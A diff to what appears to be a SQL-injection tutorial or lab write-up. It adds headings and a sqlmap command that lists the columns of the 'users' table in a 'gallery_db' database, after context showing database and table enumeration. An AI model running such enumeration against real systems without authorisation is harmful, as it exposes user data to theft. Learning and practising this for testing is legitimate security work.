@@ -158,6 +158,8 @@ available databases [2]:
 [*] information_schema
 ```
 
+### Getting Tables for a Database
+
 There are two databases, I can now select a database and get all the tables for that database. In my example, I only care about the gallery database. So I run the following command to get all the tables in the `gallery_db` database:
 
 `sqlmap -r request.txt -D gallery_db --tables`
@@ -174,3 +176,9 @@ Database: gallery_db
 | users       |
 +-------------+
 ```
+
+### Getting Columns for a Table
+
+Looking at the list, users is the table that I want to start pulling data from. I'll wager that I don't need most of the columns for this table. I am going to get the columns for the users table by running the following command:
+
+`sqlmap -r request.txt -D gallery_db -T users --columns`
